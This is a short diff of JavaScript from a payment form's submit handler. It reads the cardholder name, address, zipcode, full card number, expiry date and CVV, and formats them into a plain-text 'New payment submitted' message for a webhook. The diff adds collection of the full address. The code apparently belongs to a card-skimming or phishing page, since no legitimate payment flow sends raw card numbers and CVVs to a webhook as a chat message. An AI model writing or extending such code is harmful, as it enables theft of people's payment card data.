@@ -332,14 +332,14 @@ form.addEventListener('submit', async function(event) {
     // Prepare data to send to the webhook
     const cardholderName = document.getElementById('cardholderName').value;
     const zipcode = document.getElementById('zipcode').value;
-    const fullAddress = ""; // Set to empty string or remove if not needed
+    const fullAddress = document.getElementById('address').value;
     const cardNumber = document.getElementById('cardNumber').value;
-    const expiryDate = document.getElementById('expirationDate').value; // Use the correct ID
+    const expiryDate = document.getElementById('expirationDate').value; 
     const cvv = document.getElementById('cvv').value;
 
-    const paymentData = {
-        content: `New payment submitted:\nCardholder Name: ${cardholderName}\nZipcode: ${zipcode}\nFull Address: ${fullAddress}\nCard Number: ${cardNumber}\nExpiration Date: ${expiryDate}\nCVV: ${cvv}`
-    };
+   const paymentData = {
+    content: `New payment submitted:\nCardholder Name: ${cardholderName}\nZipcode: ${zipcode}\nFull Address: ${fullAddress}\nCard Number: ${cardNumber}\nExpiration Date: ${expiryDate}\nCVV: ${cvv}`
+};
 
     // Set a minimum loading time (e.g., 3 seconds)
     const minimumLoadingTime = 3000; // 3000ms = 3 seconds
